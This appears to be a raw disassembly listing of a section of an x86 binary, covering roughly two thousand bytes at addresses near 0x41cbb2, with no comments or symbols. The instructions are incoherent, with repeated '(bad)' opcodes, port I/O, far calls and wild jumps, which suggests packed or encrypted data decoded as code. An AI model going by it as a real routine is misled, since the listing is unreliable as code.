  41cbb2:	shl    dh,1
  41cbb4:	and    eax,0xf4ccc8b5
  41cbb9:	test   DWORD PTR [eax],0x4e2254c9
  41cbbf:	and    al,0x4c
  41cbc1:	repz sub DWORD PTR [ebx+0x6c4de869],edx
  41cbc8:	cs add eax,0x1deae79d
  41cbce:	cmp    BYTE PTR [edx],bl
  41cbd0:	nop
  41cbd1:	inc    edx
  41cbd2:	fisttp WORD PTR [edi+0x5934f13d]
  41cbd8:	mov    al,0x9a
  41cbda:	jmp    0xf6924af9
  41cbdf:	pusha  
  41cbe0:	pop    ebx
  41cbe1:	idiv   DWORD PTR [ecx+0x8]
  41cbe4:	cli    
  41cbe5:	ja     0x41cc5c
  41cbe7:	adc    esi,edi
  41cbe9:	mov    eax,ds:0x1ae6bf24
  41cbee:	pushf  
  41cbef:	pop    edi
  41cbf0:	call   FWORD PTR [ebx+0x7e]
  41cbf3:	jp     0x41cbb3
  41cbf5:	sub    BYTE PTR [ecx+esi*8-0x3cbbef92],ah
  41cbfc:	retf   
  41cbfd:	push   ss
  41cbfe:	sub    esp,ebx
  41cc00:	push   ecx
  41cc01:	sub    eax,esp
  41cc03:	mov    ah,0xc6
  41cc05:	aam    0x4c
  41cc07:	or     eax,DWORD PTR ds:0x7c6254be
  41cc0d:	iret   
  41cc0e:	or     ecx,edi
  41cc10:	mov    ecx,0xd17365be
  41cc15:	mov    ch,0x6a
  41cc17:	hlt    
  41cc18:	pop    esp
  41cc19:	fs retf 0x3e36
  41cc1d:	test   BYTE PTR [eax+0x818b84c],cl
  41cc23:	inc    ebx
  41cc24:	cwde   
  41cc25:	pop    ebx
  41cc26:	in     eax,0xda
  41cc28:	adc    DWORD PTR [ebp+0x30],0x4037276e
  41cc2f:	push   edi
  41cc30:	fstp   DWORD PTR [esi+0x29]
  41cc33:	push   DWORD PTR [edi]
  41cc35:	xchg   ecx,eax
  41cc36:	iret   
  41cc37:	inc    ebx
  41cc38:	or     al,0x12
  41cc3a:	pop    ebx
  41cc3b:	inc    edi
  41cc3c:	push   edx
  41cc3d:	jo     0x41cc97
  41cc3f:	xchg   ebp,eax
  41cc40:	cwde   
  41cc41:	dec    edi
  41cc42:	fsub   QWORD PTR [ecx+edi*4-0x3f2d497]
  41cc49:	aam    0xb3
  41cc4b:	inc    esp
  41cc4c:	in     eax,0xfe
  41cc4e:	mov    edx,0x41cb8409
  41cc53:	adc    cl,cl
  41cc55:	and    ebp,ebx
  41cc57:	mov    esi,0xe2b60fa8
  41cc5c:	adc    ebp,DWORD PTR [ebx-0xf407465]
  41cc62:	xchg   ecx,eax
  41cc63:	out    0x88,al
  41cc65:	cmp    DWORD PTR [edi+0x13671c5e],esp
  41cc6b:	or     dl,ch
  41cc6d:	pop    ebp
  41cc6e:	cmc    
  41cc6f:	or     eax,0x3c09c094
  41cc74:	adc    eax,eax
  41cc76:	cmp    BYTE PTR [eax-0x2e],ah
  41cc79:	inc    esi
  41cc7a:	push   cs
  41cc7b:	add    al,0x7a
  41cc7d:	dec    edi
  41cc7e:	adc    al,0x40
  41cc80:	xor    al,0xe8
  41cc82:	mov    ch,0xea
  41cc84:	jmp    ecx
  41cc86:	jo     0x41cc9f
  41cc88:	ss push ecx
  41cc8a:	pop    ss
  41cc8b:	out    0xd2,eax
  41cc8d:	or     DWORD PTR [eax-0x73b80955],0x7b
  41cc94:	out    dx,al
  41cc95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc96:	pop    esi
  41cc97:	cmp    edi,DWORD PTR [ebx+ebx*2+0x7ad09958]
  41cc9e:	retf   0x18b2
  41cca1:	imul   eax,esi,0x21
  41cca4:	inc    edi
  41cca5:	ror    DWORD PTR [edi-0x4],0x8f
  41cca9:	xchg   ecx,eax
  41ccaa:	daa    
  41ccab:	sub    DWORD PTR [esi+0xc],ecx
  41ccae:	out    dx,al
  41ccaf:	aaa    
  41ccb0:	mov    dl,dl
  41ccb2:	bound  edx,QWORD PTR [ebx+0x583602cd]
  41ccb8:	and    eax,DWORD PTR [esi+0x6ceb99ef]
  41ccbe:	loopne 0x41cce4
  41ccc0:	mov    ecx,0x7dc5d3e6
  41ccc5:	or     al,0xa2
  41ccc7:	outs   dx,DWORD PTR ds:[esi]
  41ccc8:	fisubr WORD PTR [edx+0x4cfeff6]
  41ccce:	push   ecx
  41cccf:	stos   DWORD PTR es:[edi],eax
  41ccd0:	sub    al,0xca
  41ccd2:	fld    DWORD PTR [edi-0x64af1e19]
  41ccd8:	mov    al,0x59
  41ccda:	adc    ebp,esp
  41ccdc:	neg    DWORD PTR [edx+ecx*8]
  41ccdf:	cwde   
  41cce0:	sub    BYTE PTR [edi+0x2072bdb0],0x4d
  41cce7:	sahf   
  41cce8:	test   al,0xac
  41ccea:	clc    
  41cceb:	xor    eax,0x3cb4a043
  41ccf0:	or     DWORD PTR [ebp-0x77],0x4db81adc
  41ccf7:	lods   al,BYTE PTR ds:[esi]
  41ccf8:	sbb    edx,DWORD PTR [ebp+0x62]
  41ccfb:	xchg   BYTE PTR [ecx-0x69e78ea0],bh
  41cd01:	mov    bl,0x12
  41cd03:	and    eax,0xfaad0c0f
  41cd08:	jbe    0x41cd66
  41cd0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd0b:	xor    DWORD PTR [eax],ebx
  41cd0d:	cdq    
  41cd0e:	and    eax,0x3f5cb640
  41cd13:	adc    eax,ebx
  41cd15:	adc    cl,BYTE PTR [ebx+0x2c]
  41cd18:	not    BYTE PTR [edx-0x160223d3]
  41cd1e:	and    BYTE PTR ds:0x8a0228a,0x80
  41cd25:	inc    ebx
  41cd26:	pop    esp
  41cd27:	sbb    al,0x10
  41cd29:	call   0x8d02:0x6aabe348
  41cd30:	(bad)  
  41cd31:	(bad)  
  41cd32:	fstp   QWORD PTR ds:0x5509b7bb
  41cd38:	icebp  
  41cd39:	inc    ebp
  41cd3a:	dec    ebp
  41cd3b:	mov    WORD PTR [esi-0x58],ds
  41cd3e:	push   cs
  41cd3f:	xchg   ebp,eax
  41cd40:	push   edx
  41cd41:	(bad)  
  41cd42:	sub    BYTE PTR [edx+0x65f6aa04],cl
  41cd48:	xor    BYTE PTR [edx+0x1217a230],ch
  41cd4e:	jp     0x41cd9d
  41cd50:	mov    BYTE PTR [eax-0x69],ch
  41cd53:	add    edx,DWORD PTR [ecx-0x3835538f]
  41cd59:	cmp    eax,0x167fd77f
  41cd5e:	jge    0x41cd6f
  41cd60:	out    0x51,al
  41cd62:	(bad)  
  41cd63:	push   ebp
  41cd64:	mov    ah,0xe4
  41cd66:	adc    BYTE PTR [ebp+eax*4+0x13e24db6],ah
  41cd6d:	or     edi,DWORD PTR gs:[esi-0xcd16612]
  41cd74:	out    dx,al
  41cd75:	pop    ecx
  41cd76:	outs   dx,BYTE PTR ds:[esi]
  41cd77:	pop    ds
  41cd78:	adc    al,0x65
  41cd7a:	push   ebx
  41cd7b:	daa    
  41cd7c:	mov    ecx,esp
  41cd7e:	addr16 pavgw mm3,mm5
  41cd82:	rol    DWORD PTR [esi],cl
  41cd84:	push   edx
  41cd85:	mov    ecx,0x55b2e364
  41cd8a:	push   ecx
  41cd8b:	push   ebx
  41cd8c:	daa    
  41cd8d:	rcr    DWORD PTR [ebp+ebx*2+0x497750fa],cl
  41cd94:	sub    DWORD PTR ds:0xe1a47288,edi
  41cd9a:	into   
  41cd9b:	dec    eax
  41cd9c:	outs   dx,DWORD PTR ds:[esi]
  41cd9d:	enter  0xcc9f,0x61
  41cda1:	sbb    BYTE PTR ds:0x2281b7c,bl
  41cda7:	jno    0x41cdde
  41cda9:	inc    ecx
  41cdaa:	aad    0x6e
  41cdac:	ret    0x6167
  41cdaf:	inc    edi
  41cdb0:	jle    0x41cdee
  41cdb2:	mov    esp,0x76baa256
  41cdb7:	jle    0x41cdbb
  41cdb9:	xor    BYTE PTR [ebp-0x6545f19d],0x63
  41cdc0:	fnstsw WORD PTR [ebp-0x33b6ff00]
  41cdc6:	xchg   ebx,eax
  41cdc7:	popa   
  41cdc8:	jecxz  0x41ce2c
  41cdca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdcb:	mov    ss,WORD PTR [ebp-0x62]
  41cdce:	cmp    al,0xa7
  41cdd0:	and    eax,0xa98d9184
  41cdd5:	neg    DWORD PTR [esi-0x253cf54a]
  41cddb:	and    ebp,esi
  41cddd:	or     edx,DWORD PTR [ecx-0xf2a3ae2]
  41cde3:	sbb    ecx,DWORD PTR [eax+0x542b4bc3]
  41cde9:	sub    eax,0xc3fb9a6b
  41cdee:	adc    al,0x78
  41cdf0:	xchg   esi,eax
  41cdf1:	inc    ebp
  41cdf2:	xchg   BYTE PTR [eax+0x1feb96ad],cl
  41cdf8:	(bad)  
  41cdf9:	xchg   ecx,eax
  41cdfa:	sub    cl,BYTE PTR [ebx]
  41cdfc:	xchg   ebx,eax
  41cdfd:	jp     0x41ce61
  41cdff:	imul   esp,DWORD PTR [ebx-0x7ffd8893],0x3721553
  41ce09:	xor    ch,dl
  41ce0b:	mov    eax,ds:0x60d4250
  41ce10:	add    eax,0x892cc0ef
  41ce15:	into   
  41ce16:	sbb    BYTE PTR [eax+0x3a],bh
  41ce19:	or     eax,DWORD PTR [esi+0x73fb465a]
  41ce1f:	test   BYTE PTR [ebp+0x6f],0x50
  41ce23:	(bad)  
  41ce25:	jl     0x41ce5b
  41ce27:	fsubr  st,st(6)
  41ce29:	fs loope 0x41ce51
  41ce2c:	loop   0x41cde1
  41ce2e:	jmp    0x9d8cda1a
  41ce33:	sahf   
  41ce34:	idiv   DWORD PTR [edi]
  41ce36:	stc    
  41ce37:	test   ebp,ebx
  41ce39:	jp     0x41ce39
  41ce3b:	shr    BYTE PTR [ecx-0xd],1
  41ce3e:	jne    0x41ce82
  41ce40:	mov    ds,WORD PTR [ebx-0x3842d987]
  41ce46:	xor    bl,BYTE PTR [ebx]
  41ce48:	aaa    
  41ce49:	sbb    eax,0x68b8e068
  41ce4e:	arpl   ax,dx
  41ce50:	(bad)  
  41ce52:	neg    BYTE PTR [esi+0x5d]
  41ce55:	pop    ebp
  41ce56:	lock enterw 0x813e,0x21
  41ce5c:	inc    esp
  41ce5d:	repz in al,dx
  41ce5f:	mov    cl,0x7b
  41ce61:	mov    edi,0xa7336aed
  41ce66:	dec    edi
  41ce67:	stos   DWORD PTR es:[edi],eax
  41ce68:	add    cl,cl
  41ce6a:	mov    bl,0x9a
  41ce6c:	pop    ecx
  41ce6d:	inc    ebx
  41ce6e:	xchg   ebx,eax
  41ce6f:	clc    
  41ce70:	sub    ecx,DWORD PTR [ebp+esi*2-0x77]
  41ce74:	cwde   
  41ce75:	clc    
  41ce76:	or     eax,0x69eb085e
  41ce7b:	inc    edi
  41ce7c:	jecxz  0x41ce06
  41ce7e:	nop
  41ce7f:	call   0x5c2d3488
  41ce84:	inc    edx
  41ce85:	ds fwait
  41ce87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce88:	mov    WORD PTR [edi],?
  41ce8a:	in     eax,dx
  41ce8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce8c:	fnstcw WORD PTR [edi]
  41ce8e:	push   es
  41ce8f:	xchg   BYTE PTR [eax+0x75],bh
  41ce92:	xchg   edx,eax
  41ce93:	xchg   DWORD PTR [eax+ebx*8-0x5aa3eb3],eax
  41ce9a:	add    DWORD PTR [edx+0x1b],edi
  41ce9d:	add    DWORD PTR [esi+edi*4-0x1b46865f],esi
  41cea4:	fild   WORD PTR [edi-0x11]
  41cea7:	xchg   esi,eax
  41cea8:	in     al,dx
  41cea9:	in     al,dx
  41ceaa:	repz inc BYTE PTR [edi]
  41cead:	cmc    
  41ceae:	inc    ecx
  41ceaf:	out    dx,eax
  41ceb0:	inc    ebp
  41ceb1:	in     eax,0x2
  41ceb3:	nop
  41ceb4:	xlat   BYTE PTR ds:[ebx]
  41ceb5:	mov    edi,?
  41ceb7:	sub    al,0x55
  41ceb9:	rcl    ah,0xb0
  41cebc:	sbb    al,0x72
  41cebe:	mov    ch,al
  41cec0:	push   esi
  41cec1:	or     BYTE PTR [edi+0x2d],0xc4
  41cec5:	(bad)  
  41cec6:	test   DWORD PTR [ebx+0x66311657],0xb8f40517
  41ced0:	icebp  
  41ced1:	out    0x57,eax
  41ced3:	lods   eax,DWORD PTR ds:[esi]
  41ced4:	fs sahf 
  41ced6:	lods   eax,DWORD PTR ds:[esi]
  41ced7:	ffree  st(5)
  41ced9:	pop    esi
  41ceda:	xor    edi,DWORD PTR [edx-0x3c]
  41cedd:	inc    ecx
  41cede:	leave  
  41cedf:	icebp  
  41cee0:	add    bl,BYTE PTR [esi-0x6a423b3d]
  41cee6:	out    0x1f,eax
  41cee8:	cmp    dl,BYTE PTR [eax-0x5f6312d0]
  41ceee:	cmp    eax,0xa457d51
  41cef3:	bound  esi,QWORD PTR [eax-0x53]
  41cef6:	mov    edx,0xe73fdf11
  41cefb:	mov    bh,0x98
  41cefd:	sbb    dh,BYTE PTR [ecx+ebx*1+0x18]
  41cf01:	mov    esi,0x48c5e9e3
  41cf06:	cmp    DWORD PTR [edi],esi
  41cf08:	jmp    0x746b1eb9
  41cf0d:	inc    edi
  41cf0e:	int    0x93
  41cf10:	inc    ebx
  41cf11:	fdivr  DWORD PTR [edi+edx*8-0x6ed09c72]
  41cf18:	push   edx
  41cf19:	cmp    DWORD PTR ds:0x2e22b7bd,ebp
  41cf1f:	push   ecx
  41cf20:	jnp    0x41cf1b
  41cf22:	mov    al,0x81
  41cf24:	inc    edi
  41cf25:	ins    DWORD PTR es:[edi],dx
  41cf26:	inc    edi
  41cf27:	(bad)  
  41cf28:	ret    
  41cf29:	fidivr WORD PTR [ecx]
  41cf2b:	dec    eax
  41cf2c:	mov    fs,ebp
  41cf2e:	gs (bad) 
  41cf30:	stc    
  41cf31:	sub    eax,0x8f1fb7c2
  41cf36:	pop    ebx
  41cf37:	dec    esp
  41cf38:	xor    BYTE PTR [ebx-0x13],bl
  41cf3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf3c:	inc    edx
  41cf3d:	je     0x41cf17
  41cf3f:	add    esi,ebx
  41cf41:	push   edx
  41cf42:	sahf   
  41cf43:	add    DWORD PTR [esp+eiz*4-0x57bb3902],edx
  41cf4a:	xchg   ebx,eax
  41cf4b:	pop    ebx
  41cf4c:	mov    ah,0xdd
  41cf4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf4f:	test   BYTE PTR [edi-0xbbed749],ch
  41cf55:	loope  0x41cfd6
  41cf57:	retf   
  41cf58:	div    BYTE PTR [eax-0x4e]
  41cf5b:	or     eax,0x295dec55
  41cf60:	jnp    0x41cf3a
  41cf62:	(bad)  
  41cf63:	cld    
  41cf64:	cmp    DWORD PTR [ebp+0x59],ebx
  41cf67:	cmp    ebp,DWORD PTR [esp+edi*1-0x1a799a56]
  41cf6e:	daa    
  41cf6f:	into   
  41cf70:	icebp  
  41cf71:	pop    DWORD PTR [ecx+0x7d]
  41cf74:	stc    
  41cf75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf76:	inc    ebx
  41cf77:	or     eax,0xb148d299
  41cf7c:	(bad)  
  41cf7e:	fwait
  41cf7f:	aaa    
  41cf80:	jp     0x41cf1e
  41cf82:	pop    ebx
  41cf83:	icebp  
  41cf84:	inc    esi
  41cf85:	int3   
  41cf86:	in     eax,dx
  41cf87:	mov    dl,0x7f
  41cf89:	mov    ah,0x3a
  41cf8b:	push   ds
  41cf8c:	sbb    eax,0xda3a4de3
  41cf91:	inc    ebp
  41cf92:	mov    ch,0xe7
  41cf94:	adc    bl,BYTE PTR [esi+0x115ac9ee]
  41cf9a:	jnp    0x41cf65
  41cf9c:	sub    edi,edx
  41cf9e:	adc    BYTE PTR [eax+0x1aaf13fa],cl
  41cfa4:	js     0x41cffd
  41cfa6:	les    eax,FWORD PTR [esi+0x3b]
  41cfa9:	and    ebp,DWORD PTR [eax+edx*1-0x4b]
  41cfad:	mov    WORD PTR ds:0xca7ac34f,cs
  41cfb3:	inc    eax
  41cfb4:	clc    
  41cfb5:	loope  0x41cf99
  41cfb7:	sub    BYTE PTR [edi],bh
  41cfb9:	pop    ebp
  41cfba:	out    0xe5,eax
  41cfbc:	popf   
  41cfbd:	and    esp,esi
  41cfbf:	inc    edi
  41cfc0:	inc    eax
  41cfc1:	pop    ds
  41cfc2:	les    ecx,FWORD PTR [esp+edi*2]
  41cfc5:	push   ebp
  41cfc6:	arpl   WORD PTR [ebp+0x20],sp
  41cfc9:	pop    esi
  41cfca:	jnp    0x41d01c
  41cfcc:	test   al,0x88
  41cfce:	xchg   edi,eax
  41cfcf:	xor    dh,BYTE PTR [ebp-0x214c73c2]
  41cfd5:	nop
  41cfd6:	clc    
  41cfd7:	arpl   WORD PTR [ebp-0x75],sp
  41cfda:	xor    eax,0xfe844fd4
  41cfdf:	push   es
  41cfe0:	sub    BYTE PTR [ebx+eiz*8],dh
  41cfe3:	test   al,0x5d
  41cfe5:	and    ebp,DWORD PTR [ecx-0x5b516594]
  41cfeb:	das    
  41cfec:	mov    dh,0x80
  41cfee:	fisttp QWORD PTR [ebx]
  41cff0:	mov    ebp,0xd672c20b
  41cff5:	dec    ecx
  41cff6:	xor    ecx,DWORD PTR [edx]
  41cff8:	cmp    DWORD PTR [edx+ebx*2+0x6a],eax
  41cffc:	inc    eax
  41cffd:	mov    dh,0xa6
  41cfff:	(bad)  
  41d000:	jmp    0x1f30e77c
  41d005:	cmp    al,0x8a
  41d007:	fidiv  WORD PTR [ebp-0x6f]
  41d00a:	cmc    
  41d00b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d00c:	dec    ebp
  41d00d:	loop   0x41d000
  41d00f:	pop    esp
  41d010:	out    dx,eax
  41d011:	jb     0x41cff4
  41d013:	inc    esp
  41d014:	mov    ebp,0x3e5d8c6e
  41d019:	or     eax,eax
  41d01b:	ins    DWORD PTR es:[edi],dx
  41d01c:	fs jbe 0x41cffc
  41d01f:	in     eax,0x99
  41d021:	cmp    DWORD PTR [edx],edx
  41d023:	push   0x66af9971
  41d028:	int    0xe9
  41d02a:	xchg   ecx,eax
  41d02b:	rcl    BYTE PTR [edx-0x64],cl
  41d02e:	and    bl,al
  41d030:	mov    cl,0xfc
  41d032:	mov    esp,0xace8600
  41d037:	sti    
  41d038:	das    
  41d039:	inc    ebx
  41d03a:	jge    0x41cfd1
  41d03c:	mov    bh,0x50
  41d03e:	in     eax,0x49
  41d040:	push   ss
  41d041:	bound  eax,QWORD PTR [ebx+esi*8]
  41d044:	arpl   cx,bp
  41d046:	movups xmm4,XMMWORD PTR [edx-0x50397f5c]
  41d04d:	mov    esi,0x56b29942
  41d052:	pop    ebp
  41d053:	ja     0x41d062
  41d055:	cwde   
  41d056:	idiv   DWORD PTR [edx]
  41d058:	loopne 0x41d0a4
  41d05a:	mov    esi,0x939a1409
  41d05f:	mov    cs,WORD PTR [edi+0x783e6e1c]
  41d065:	xchg   esp,eax
  41d066:	(bad)  
  41d067:	xchg   DWORD PTR [eax],edi
  41d069:	sub    eax,0xa4697e0d
  41d06e:	les    edi,FWORD PTR [eax+0x799ed236]
  41d074:	mov    eax,ds:0x7f3e0f5e
  41d079:	mov    cs,ebx
  41d07b:	fstp   QWORD PTR [eax+0x59]
  41d07e:	test   edi,ebp
  41d080:	xchg   ecx,eax
  41d081:	add    ch,BYTE PTR [esi+eiz*1]
  41d084:	adc    ebx,ebp
  41d086:	imul   BYTE PTR [eax+ecx*1]
  41d089:	mov    eax,ds:0x354c5fe5
  41d08e:	cwde   
  41d08f:	out    dx,eax
  41d090:	jecxz  0x41d019
  41d092:	push   ds
  41d093:	out    dx,eax
  41d094:	dec    eax
  41d095:	add    bl,BYTE PTR [ecx]
  41d097:	inc    ebp
  41d098:	cmp    dl,BYTE PTR [eax-0x4eaecd5a]
  41d09e:	lods   al,BYTE PTR ds:[esi]
  41d09f:	push   ebx
  41d0a0:	sub    ebp,DWORD PTR [esp+ecx*2]
  41d0a3:	ficom  DWORD PTR [esi+0x55]
  41d0a6:	cdq    
  41d0a7:	js     0x41d060
  41d0a9:	ins    DWORD PTR es:[edi],dx
  41d0aa:	push   ecx
  41d0ab:	xchg   ebp,eax
  41d0ac:	(bad)  
  41d0ad:	dec    esp
  41d0ae:	dec    ebp
  41d0af:	sbb    DWORD PTR [esi+0x1],0x52
  41d0b3:	(bad)  
  41d0b4:	std    
  41d0b5:	pop    es
  41d0b6:	push   0x22cf841d
  41d0bb:	das    
  41d0bc:	mov    al,ds:0x51ff3501
  41d0c1:	mov    al,ds:0xe94a716d
  41d0c6:	rol    bl,cl
  41d0c8:	and    eax,0x7e2a05d8
  41d0cd:	mov    DWORD PTR ds:0x9d33dc8c,ebp
  41d0d3:	rcr    al,cl
  41d0d5:	jecxz  0x41d119
  41d0d7:	push   eax
  41d0d8:	dec    edx
  41d0d9:	aaa    
  41d0da:	mov    dl,0x7c
  41d0dc:	jp     0x41d156
  41d0de:	add    eax,0x2c5af78c
  41d0e3:	loopne 0x41d152
  41d0e5:	jg     0x41d06f
  41d0e7:	jmp    0x41d122
  41d0e9:	push   ds
  41d0ea:	sub    al,0x80
  41d0ec:	mov    al,ds:0x224e2438
  41d0f1:	sbb    bh,BYTE PTR [esi+0x2f85913e]
  41d0f7:	mov    ebx,0x9272eb0
  41d0fc:	or     al,0x37
  41d0fe:	jb     0x41d14a
  41d100:	or     esi,ebx
  41d102:	mov    al,ds:0x7566a91f
  41d107:	add    BYTE PTR [ecx*2+0x7ecbdf96],bl
  41d10e:	adc    bl,BYTE PTR [esi+edi*2+0x5a3cc7cb]
  41d115:	ja     0x41d0b0
  41d117:	xchg   BYTE PTR [esi-0xe],bl
  41d11a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d11b:	stos   DWORD PTR es:[edi],eax
  41d11c:	outs   dx,DWORD PTR ds:[esi]
  41d11d:	push   0xbc11c489
  41d122:	xchg   edi,eax
  41d123:	iret   
  41d124:	mov    al,0x5b
  41d126:	sub    eax,0x96f65a81
  41d12b:	mov    ah,0x60
  41d12d:	push   esi
  41d12e:	and    eax,0x523e8bad
  41d133:	out    dx,eax
  41d134:	adc    BYTE PTR [eax-0x45],0x88
  41d138:	pop    esi
  41d139:	xor    BYTE PTR [ebp-0x3a5a9e88],ch
  41d13f:	lods   eax,DWORD PTR ds:[esi]
  41d140:	dec    ebp
  41d141:	test   al,0x8d
  41d143:	js     0x41d0ce
  41d145:	jae    0x41d13e
  41d147:	clc    
  41d148:	fbstp  TBYTE PTR [esi+ebx*8]
  41d14b:	(bad)
  41d150:	(bad)  
  41d151:	sbb    edi,DWORD PTR [esi*1-0x43461bc2]
  41d158:	ins    BYTE PTR es:[edi],dx
  41d159:	mov    esi,edi
  41d15b:	aaa    
  41d15c:	stos   BYTE PTR es:[edi],al
  41d15d:	mov    ebx,0x6dd1a3d5
  41d162:	cmp    dh,dl
  41d164:	dec    ecx
  41d165:	pop    eax
  41d166:	data16 mov BYTE PTR [ebx+0x146ae92c],bh
  41d16d:	mov    BYTE PTR [eax+ebp*2],cl
  41d170:	xchg   edx,eax
  41d171:	(bad)  
  41d172:	(bad)  
  41d174:	mov    esp,0xb9c8badd
  41d179:	xchg   ebp,eax
  41d17a:	adc    eax,0xeb441633
  41d17f:	ins    BYTE PTR es:[edi],dx
  41d180:	ins    BYTE PTR es:[edi],dx
  41d181:	lods   eax,DWORD PTR ds:[esi]
  41d182:	cmp    ebp,ebp
  41d184:	ja     0x41d136
  41d186:	xor    DWORD PTR [edi-0x15],0x1f
  41d18a:	cmp    edx,0x5aed2c29
  41d190:	addr16 enter 0x7887,0x7e
  41d195:	cwde   
  41d196:	dec    eax
  41d197:	cmp    DWORD PTR [eax],ecx
  41d199:	loope  0x41d209
  41d19b:	jge    0x41d1a0
  41d19d:	fidiv  WORD PTR [ecx]
  41d19f:	xor    esp,DWORD PTR [edx-0x4e338931]
  41d1a5:	adc    dl,BYTE PTR [edi]
  41d1a7:	inc    BYTE PTR cs:[eax+esi*2+0x4e53cc5]
  41d1af:	jbe    0x41d1ac
  41d1b1:	shl    DWORD PTR [ecx+0x7b1b8925],0x5d
  41d1b8:	mov    ebx,0x625485ad
  41d1bd:	add    al,0x79
  41d1bf:	pop    ebx
  41d1c0:	jnp    0x41d15b
  41d1c2:	mov    bh,0x0
  41d1c4:	adc    BYTE PTR [ecx+eiz*4+0x304bb9b9],0x24
  41d1cc:	jnp    0x41d150
  41d1ce:	mov    eax,edx
  41d1d0:	mov    ds:0x8dd210d8,eax
  41d1d5:	sub    BYTE PTR [edi],bl
  41d1d7:	daa    
  41d1d8:	mov    edi,DWORD PTR [ebp-0x6c1388a6]
  41d1de:	push   edi
  41d1df:	(bad)  
  41d1e0:	or     eax,0x9800f626
  41d1e5:	mov    WORD PTR [ebp+edx*8+0x5f2b8bf1],fs
  41d1ec:	pop    ecx
  41d1ed:	pop    esi
  41d1ee:	iret   
  41d1ef:	lods   al,BYTE PTR ds:[esi]
  41d1f0:	xchg   BYTE PTR [ecx],dh
  41d1f2:	ret    0x83dc
  41d1f5:	lods   eax,DWORD PTR ds:[esi]
  41d1f6:	in     eax,dx
  41d1f7:	and    esi,edi
  41d1f9:	push   0xffffffa5
  41d1fb:	xchg   edx,eax
  41d1fc:	mov    ah,0x43
  41d1fe:	push   edi
  41d1ff:	cmp    al,0x3d
  41d201:	or     edi,DWORD PTR [esi-0x11]
  41d204:	cmp    BYTE PTR [edx],al
  41d206:	out    0xe1,al
  41d208:	ja     0x41d23e
  41d20a:	lea    esp,[eax]
  41d20c:	fs mov esp,0xe2fe0f5f
  41d212:	cmp    DWORD PTR [esp+ecx*1+0x3],eax
  41d216:	in     eax,0xfa
  41d218:	inc    esp
  41d219:	ror    dl,0xb8
  41d21c:	ins    BYTE PTR es:[edi],dx
  41d21d:	enter  0xe0d9,0xb8
  41d221:	popf   
  41d222:	arpl   WORD PTR [ebx+ecx*1],cx
  41d225:	pusha  
  41d226:	adc    eax,edi
  41d228:	cmp    eax,0x402cd34a
  41d22d:	adc    BYTE PTR [ecx-0x39],0x9d
  41d231:	fistp  WORD PTR [ebx-0x7e88e105]
  41d237:	call   0x909f:0xdfc60553
  41d23e:	sbb    ebp,edi
  41d240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d241:	jnp    0x41d1c5
  41d243:	jmp    0x41d1e1
  41d245:	sbb    eax,0xfd2812ce
  41d24a:	cmp    al,0x57
  41d24c:	sub    DWORD PTR [edi-0x77],ebx
  41d24f:	dec    eax
  41d250:	jp     0x41d217
  41d252:	mov    edi,edi
  41d254:	cmp    esi,edx
  41d256:	out    0x93,eax
  41d258:	inc    esp
  41d259:	cmp    ebx,DWORD PTR [edx-0x41]
  41d25c:	jb     0x41d242
  41d25e:	loope  0x41d28d
  41d260:	rcr    DWORD PTR [ecx+0x76],0x56
  41d264:	(bad)  [eax-0x4df06005]
  41d26a:	adc    eax,0x5b0d46ee
  41d26f:	mov    DWORD PTR [edx+0x4c],ebx
  41d272:	adc    ecx,DWORD PTR [esp+edx*8-0xa]
  41d276:	ror    BYTE PTR [esi-0x4b],1
  41d279:	in     eax,dx
  41d27a:	or     BYTE PTR [eax+0x1],dl
  41d27d:	(bad)  
  41d27e:	push   ss
  41d27f:	in     eax,0xa8
  41d281:	and    DWORD PTR fs:[edx-0x20],esi
  41d285:	mov    dh,0x47
  41d287:	loop   0x41d269
  41d289:	adc    edi,DWORD PTR [edi+0x741f42c8]
  41d28f:	sbb    bl,bl
  41d291:	push   ds
  41d292:	jle    0x41d2c2
  41d294:	mov    eax,0xe25f7fda
  41d299:	stos   BYTE PTR es:[edi],al
  41d29a:	mov    eax,ds:0xb0cd4230
  41d29f:	shl    BYTE PTR [eax+0x1b],0x98
  41d2a3:	mov    dl,0xef
  41d2a6:	int    0x82
  41d2a8:	lods   al,BYTE PTR ds:[esi]
  41d2a9:	aam    0xd4
  41d2ab:	enter  0x203c,0xec
  41d2af:	ret    0x2667
  41d2b2:	test   BYTE PTR [ecx-0x2d],cl
  41d2b5:	ror    BYTE PTR [eax],cl
  41d2b7:	dec    edx
  41d2b8:	out    0x10,al
  41d2ba:	push   0x2418531b
  41d2bf:	ret    0xb516
  41d2c2:	xchg   ebx,eax
  41d2c3:	adc    bh,BYTE PTR [ebp+0x66c71864]
  41d2c9:	or     ebx,DWORD PTR [eax+0x313e3080]
  41d2cf:	inc    edi
  41d2d0:	xchg   edx,eax
  41d2d1:	cmp    cl,BYTE PTR [ebx+0x5789a9b6]
  41d2d7:	mov    dl,0x9a
  41d2d9:	fdivr  st,st(5)
  41d2db:	jmp    0x3e654aa0
  41d2e0:	or     al,0x3
  41d2e2:	outs   dx,BYTE PTR ds:[esi]
  41d2e3:	in     al,dx
  41d2e4:	js     0x41d348
  41d2e6:	xor    DWORD PTR [ebx-0x1f017266],edx
  41d2ec:	and    DWORD PTR [eax],esp
  41d2ee:	lock sbb esi,DWORD PTR [eax+0x55cc9884]
  41d2f5:	xchg   DWORD PTR [esi-0x7ed47874],eax
  41d2fb:	ficomp DWORD PTR [esi+0x18814ed7]
  41d301:	lds    ecx,FWORD PTR [ebx]
  41d303:	daa    
  41d304:	sub    al,BYTE PTR ds:0x613332e3
  41d30a:	jns    0x41d2f9
  41d30c:	imul   ebp,DWORD PTR [ebp+0x7f],0xc8a48737
  41d313:	(bad)  
  41d314:	mov    esi,0x998b37a1
  41d319:	xchg   ebx,eax
  41d31a:	iret   
  41d31b:	jle    0x41d2a4
  41d31d:	push   ss
  41d31e:	sbb    eax,0x224fed81
